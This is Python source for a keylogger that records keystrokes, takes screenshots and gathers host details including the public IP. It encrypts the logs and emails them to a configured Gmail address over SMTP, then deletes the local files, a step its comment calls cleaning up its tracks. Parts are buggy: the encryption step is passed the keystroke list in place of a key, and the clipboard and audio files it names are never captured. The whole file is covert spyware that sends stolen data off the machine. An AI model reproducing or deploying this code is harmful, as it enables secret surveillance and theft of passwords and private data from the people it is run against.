#LIBRARIES
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab, Image
from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
from scipy.io.wavfile import write
import sounddevice as sd
import getpass
import smtplib
import socket
import platform
import time
import os


email_address = ""
password = ""
toaddr = email_address
keys_info= "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"
file_path= "//Users//architrohatgi//Developer//KeyLogger"
extend= "//"
file_merge = file_path + extend
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3
count= 0
keys= []


def send_email(filename, attachment, toadd):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toadd
    msg['Subject'] = "KeyLogger Log Text File"
    body = "Kindly find the attached document, which contains the key log."
    msg.attach(MIMEText(body, 'plain'))
    filename= filename
    attachment= open(attachment, "rb")
    p = MIMEBase("application", "octet-stream")
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename = %s", filename=filename)
    msg.attach(p)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toadd, text)
    server.quit()

# get the computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()
computer_information()
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

# Timer for keylogger
while number_of_iterations < number_of_iterations_end:
    count = 0
    keys =[]

    def on_press(key):
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    if currentTime > stoppingTime:
        with open(file_path + extend + keys_info, "w") as f:
            f.write(" ")
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        number_of_iterations += 1
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypt files
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_info]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()
    fernet = Fernet(keys)
    encrypted = fernet.encrypt(data)
    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)
    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1
time.sleep(120)

# Clean up our tracks and delete files
delete_files = [system_information, clipboard_information, keys_info, screenshot_information, audio_information]
for file in delete_files:
    os.remove(file_merge + file)
